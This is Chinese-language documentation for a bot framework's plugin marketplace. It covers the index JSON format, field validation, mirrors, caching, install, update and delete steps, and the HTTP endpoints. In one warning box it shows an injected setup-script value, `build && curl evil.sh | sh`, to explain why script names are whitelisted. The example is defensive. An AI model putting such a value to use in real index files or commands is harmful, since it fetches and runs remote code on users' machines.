# 插件市场与索引文件格式

内核默认不携带任何插件。除手工放置插件目录之外，另一条安装途径是插件市场：面板从若干个
JSON 索引文件读取可用插件清单，选定条目后由内核完成下载、校验与落盘。

市场只负责取索引与读写插件目录，**不参与插件加载**。安装完成后是否立即加载由调用方决定，
因此索引文件里不存在任何与加载顺序、依赖注入相关的字段。

默认索引地址为 `https://raw.githubusercontent.com/Yunzai-NG/plugin-index/main/index.json`，
可在配置项 `market.sources` 中替换或追加。

::: tip 面板插件另有一份索引与另一个页面
本页说的是**内核插件**（适配器、渲染器、功能插件），装进内核的插件目录。而往面板上添组件的
**面板插件**走另一条路：索引是同一仓库的 `webui_index.json`（顶层键 `panels`，版本门
`minWebui`），页面是面板的「面板商店」，落点是 webui 安装目录下的 `plugins/`。字段与语义见
[面板插件文档的「上架到商店」](./panel-plugin.md#上架到商店)。

两份索引**刻意互不相认**：顶层键不同，故把面板索引填进 `market.sources` 会直接报格式不符，
而不是列出一堆装到错地方的条目。

镜像前缀 `market.mirror` 是**两处共用**的一项 —— 面板商店读的就是这里，不必再填一遍。
:::

## 索引文件格式

索引文件是一份 UTF-8 编码的 JSON 文档，接受两种形状：

```json
{
  "plugins": [
    {
      "name": "adapter-napcat",
      "title": "NapCat 适配器",
      "description": "以 OneBot v11 协议接入 NapCat，支持正向与反向 WebSocket、HTTP 与 HTTP POST 四种网络模式。",
      "author": "yunzai-ng",
      "version": "1.0.0",
      "homepage": "https://github.com/yunzai-ng/adapter-napcat",
      "minCore": "1.0.0",
      "tags": ["适配器", "QQ"],
      "official": true,
      "install": {
        "type": "git",
        "url": "https://github.com/yunzai-ng/adapter-napcat",
        "branch": "main"
      }
    }
  ]
}
```

顶层亦可直接是条目数组：

```json
[{ "name": "hello", "install": { "type": "git", "url": "https://example.com/hello.git" } }]
```

两种形状等价。后者便于将一份手写数组挂在静态文件服务上作为私有索引。文档既不是数组、
也不含 `plugins` 数组时，该索引地址整体失败并记为 `索引格式不符：期望数组或含 plugins 数组的对象`。

## 字段

| 字段 | 必填 | 类型 | 说明 |
|---|---|---|---|
| `name` | 是 | string | 插件名，同时是安装后的目录名 |
| `install` | 是 | object | 安装来源，见下 |
| `title` | 否 | string | 展示名称，缺省取 `name` |
| `description` | 否 | string | 一句话说明，缺省为空串 |
| `author` | 否 | string | 作者 |
| `version` | 否 | string | 索引中记录的版本，仅在插件自身 `package.json` 无 `version` 时用于展示 |
| `homepage` | 否 | string | 主页地址，面板据此提供跳转 |
| `minCore` | 否 | string | 所需的最低内核版本 |
| `tags` | 否 | string[] | 标签，用于面板筛选；非字符串元素被剔除 |
| `official` | 否 | boolean | 是否官方维护，仅 `true` 生效，其他值一律视为 `false` |
| `setup` | 否 | object | 装后步骤：装完依赖之后还要跑哪些 npm script，见下 |

`install` 的字段：

| 字段 | 必填 | 说明 |
|---|---|---|
| `type` | 是 | `git` 或 `tarball`，其余取值使该条目无效 |
| `url` | 是 | 必须以 `http://` 或 `https://` 开头 |
| `branch` | 否 | 分支名。`type` 为 `git` 时传给 `--branch`；换算归档地址时作为归档的引用，缺省取 `HEAD` |

`setup` 的字段：

| 字段 | 必填 | 说明 |
|---|---|---|
| `scripts` | 是 | script 名数组，按序执行，一个失败即停。每个名字须匹配 `/^[a-z\d][a-z\d:._-]*$/i` |
| `dev` | 否 | 装依赖时是否连 `devDependencies` 一起装，缺省 `true` |

**为什么由索引声明，而不是读插件的 `package.json`。** `scripts` 里有开发用的（`test`、`lint`）、
有幂等的（`build`）、有会下载上百兆的（`install:browser`），从名字分不出该跑哪些。索引是经审核的
那一份事实，故「该跑什么」写在这里。此外，装后步骤要在**取到内容之前**就能让面板说清「这次会跑
什么」，而 `package.json` 要等下载完才读得到。

`dev` 缺省为真：要靠 `build` 出产物的插件必须如此 —— 编译器在 `devDependencies` 里，
`--prod` 装出来的目录跑 `build` 会报「找不到 tsc」，离真实原因很远。

::: warning script 名是要拼进命令行的
Windows 上 `pnpm` / `npm` 是 `.cmd`，node 拒绝不经 shell 执行它们，于是包管理器只能带 shell 起 ——
那时参数是被解释的字符串，索引里一个 `build && curl evil.sh | sh` 就是任意命令执行。故名字逐个过
上述白名单，且**任一不合法即丢弃整个 `setup`**（而非只跳过那一个）：只跳过会得到一份「跑了一半」的
装后步骤，装出「依赖装了、产物没编译」的插件，加载时报「找不到 dist/index.js」，离真实原因很远。
:::

字符串字段在解析时去除首尾空白，去除后为空串者按缺失处理。

### 校验与丢弃

`name` 须匹配 `/^[a-z\d][a-z\d._-]*$/i` 且不以 `.` 开头。该名称会参与插件目录的路径拼接，
因此采用白名单而非黑名单：路径越界校验能拦住 `../`，但拦不住 `.git`、`node_modules`
这类落在目录之内却会破坏运行环境的名称。

**必填字段不合法的记录被静默丢弃，同一份索引中的其余记录照常生效。** 一条记录写错不应当
使整个索引不可用；面板展示的条目数取自解析结果，与文件中的记录数不一致即说明存在被丢弃的记录。

## 多个索引与优先级

`market.sources` 可填多个地址，按声明顺序依次获取。**同名插件以先出现者为准**，因此私有
索引应置于官方索引之前，以此覆盖官方条目。

部分地址失败时，成功的部分照常合并，失败者以获取失败的形态出现在面板的索引来源列表中；
面板将其与"索引本身为空"分开呈现，因为前者需检查网络与 `market.mirror`，后者需检查索引内容。

全部地址均失败且磁盘缓存可用时沿用缓存，并记一条 warn。全部失败且无缓存时条目置空，
但仍记录获取时间：重试须由用户显式触发，避免每次打开页面都重复请求已知不可达的地址。

### 镜像

`market.mirror` 以 `前缀 + 原始地址` 的方式拼接，且**仅对 `github.com`、
`raw.githubusercontent.com`、`codeload.github.com` 三个主机生效**。镜像站点通常只代理
GitHub，对任意地址一律套上前缀会使自建索引无法访问，且排查困难 —— 用户看到的将是镜像站的
404 而非自身地址书写错误。

### 缓存

`market.cacheTtl`（缺省 `1h`）内不再发起请求。缓存同时写入 `cache/market-index.json`，
故在无网络时仍可展示上次获取到的清单。缓存文件按不可信输入对待，读取时重新经索引解析校验：
它可能被手工改动，也可能是旧版本写下的、字段形状已不同的内容。缓存写入失败只记 debug 日志，
不影响本次获取的结果。

`market.timeout`（缺省 `15s`）是单个索引地址的请求超时。插件下载与克隆另有 5 分钟的超时。

## 安装过程

1. 校验插件名，并在索引中查找该条目。
2. 若声明了 `minCore` 且当前内核版本低于它，即刻报错。版本比较仅取点分数值段，忽略预发布标识。
3. 目标目录已存在时报错，除非本次是更新。
4. 在临时目录下取源。**git 优先**：克隆得到的目录带 `.git`，用户此后可自行 `git pull` 或切换分支。
   克隆使用 `clone --depth 1 --single-branch`，并以 `GIT_TERMINAL_PROMPT=0` 与 `GIT_ASKPASS`
   关闭凭据提示 —— 安装发生在服务进程内，等待输入的子进程无人应答。
5. 本机无 git 时退回归档下载：`type` 为 `tarball` 直接使用其地址；`type` 为 `git` 且地址是
   GitHub 仓库时换算为 codeload 归档地址，其余来源明确报错而非静默失败。归档体积上限 64 MiB，
   解包后若只有单一顶层目录则剥去该层。
6. 校验取到的内容具备插件形态：目录内须有 `package.json`，或 `index.js`、`index.mjs`、
   `index.cjs`、`dist/index.js`、`dist/index.mjs` 之一。此校验的目的是及早给出可理解的错误 ——
   地址写错时取到的往往是文档仓库或空目录，不检查便移入插件目录的话，用户看到的会是下次启动时的一条加载失败。
7. 读取 `package.json` 的 `version` 与 `dependencies`，随后将内容移入插件目录。

全过程在临时目录内完成，**仅在校验通过后才移入插件目录**，因此失败时插件目录保持原状。
移动优先使用改名，跨分区（`EXDEV`）时退回递归复制。

### 依赖与装后步骤

装完内容之后，内核**会代跑包管理器**：先 `pnpm install`（找不到 pnpm 时退回 `npm install`），
再按索引的 `setup.scripts` 依次跑那几个 script。面板的安装与更新默认请求这一步，请求体里
传 `dependencies: false` 可以关掉（离线部署、或依赖已随镜像预置时用得上）。

这**不是**一道新的信任边界：插件的入口下一秒就会被 `import()` 进 node 进程执行，install 脚本
与它同属一道门。缺省就跑的理由是另一个 —— 不跑的后果是「装完却加载失败」成为常态，而那条
「请到目录内自行执行」的提示，对着的是一个多数人不会去开的终端。面板的确认框会把要跑的 script
逐个列出来：`build` 要编译、`install:browser` 要下载上百兆，事先不说会让人以为界面卡住了。

两步在**移入插件目录之后**、于插件目录内进行，不在临时目录里做完再搬 —— pnpm 的 `node_modules`
里全是指向 store 的符号链接，换个路径就断，而断掉的表现是加载时报找不到模块。代价是这一步失败
会留下一个「装好了但缺依赖」的目录，那是可说清的状态，比一个链接全断的目录好收拾。

失败不让整次安装失败，而是记进返回值：

| 字段 | 含义 |
|---|---|
| `needsDependencies` | 声明了 `dependencies` 而目录内仍没有 `node_modules` |
| `installedDeps` | 本次是否确实跑过包管理器 |
| `packageManager` | 用的是 `pnpm` 还是 `npm` |
| `dependencyError` | 装依赖失败的原因 |
| `ranScripts` | 实际跑完的 script，按执行顺序 |
| `setupError` | 装后步骤失败的原因，前缀是失败在哪个 script 上 |

`dependencyError` 与 `setupError` 分成两项而非合一，因为**后手不同**：缺依赖是去目录里执行包管理器，
缺产物是去执行那个 script。这三种情形（缺依赖、依赖装失败、装后步骤失败）内核一律**不加载**该插件 ——
都注定失败，而报出来的错离原因很远（前者说「找不到某个包」，后者说「找不到 dist/index.js」）。

就地拉取那条路上有一处例外：远端没有新提交、且依赖不缺时，这一步整个跳过 —— 那一次「更新」什么都
没改，重跑 `build` 只是白等一遍编译。反之，**拉到了新提交就一定跑装后步骤，哪怕依赖不缺**：`build`
的产物在 `dist/`，而那一层多半被插件仓库 `.gitignore` 掉了，此时跳过就还是跑着上一版的代码，且毫无迹象。

## 更新与删除

更新等价于"重新安装"：先删除原目录再整体写入，而非增量覆盖。插件目录内不保存用户数据，
整体替换的结果可预期，不会出现新旧版本文件混杂的中间状态。

删除**只删除插件目录**。配置文件与数据库另行存放，保留它们使得重新安装后原有配置仍然有效。
删除前会先卸载该插件，以免文件已消失而注册项仍然在册。

## 面板与 HTTP 端点

| 端点 | 说明 |
|---|---|
| `GET market` | 取清单，允许命中缓存；`?refresh=1` 强制回源 |
| `POST market/refresh` | 强制回源 |
| `POST market/install` | 请求体 `{ name, load?, dependencies? }`，安装后默认立即加载、默认装依赖并跑装后步骤 |
| `POST market/:name/update` | 更新；更新前先卸载旧版本，`load` 与 `dependencies` 同上 |
| `POST market/:name/setup` | **只重跑装依赖与装后步骤，不重新取源**；请求体 `{ load? }` |
| `DELETE market/:name` | 卸载并删除目录；目录本不存在时 404 |

`market/:name/setup` 是给三种情形留的口子：手工放进插件目录的插件（压根没有安装动作可挂）、
装的时候这一步失败过、以及使用者自己 `git pull` 过而 `dist/` 已旧。它与安装那条路共用同一段实现，
故「装什么、跑什么」只有一处定义。**索引里没有这个插件也照做**，只是那时不跑装后步骤（无从知道
该跑什么）—— 手工放进去的插件多半不在任何索引里，拿不到条目就拒绝会让这个口子恰在最需要它的
场合失效。它先卸载再跑：`build` 会覆盖 `dist/`，而旧模块此刻还在内存里响应命令。

清单中每个条目的安装状态每次都重新读取文件系统，不沿用缓存：用户可能在面板之外手工删除了
插件目录，沿用缓存状态会使删除按钮指向一个并不存在的目录。

刷新索引**不要求写权限**：它只发起一次网络请求，不改动任何本地状态，只读模式下亦应可用。
安装、更新与删除均要求写权限。未启用市场的部署上，以上端点一律返回 501
`当前部署未启用插件市场`，而非 404 —— 端点存在，只是该部署未提供此能力。

## 自建索引

将一份符合上述格式的 JSON 文件置于任意可通过 HTTP 访问的位置，并把地址填入 `market.sources`
的首位即可。索引文件不必与插件仓库同源，其中的每个条目各自指向自己的 `install.url`。
